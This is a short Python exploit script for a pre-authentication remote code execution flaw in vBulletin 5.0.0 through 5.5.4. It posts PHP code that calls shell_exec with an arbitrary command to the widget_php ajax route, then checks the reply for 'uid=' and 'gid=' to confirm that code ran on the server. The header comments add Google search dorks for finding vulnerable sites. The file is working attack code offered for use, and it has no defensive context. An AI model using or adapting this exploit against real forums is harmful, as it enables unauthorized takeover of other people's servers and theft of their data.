#!/usr/bin/python
#
# vBulletin 5.x 0day pre-auth RCE exploit
# 
# This should work on all versions from 5.0.0 till 5.5.4
#
# Google Dorks:
# - site:*.vbulletin.net
# - "Powered by vBulletin Version 5.5.4"

import requests
import sys




params = {"routestring":"ajax/render/widget_php"}

def exploit(url,mode, cmd):
     try:
          params["widgetConfig[code]"] = "echo shell_exec('"+cmd+"');echo md5('vBulletin'); exit;"
          r = requests.post(url , data = params)
          if mode == "attack":
               if  "uid=" in r.text and "gid=" in r.text: 
                    return True
               else: 
                    return False
          else: 
               return True
     except KeyboardInterrupt:
          return False
     except Exception as e:
          return False


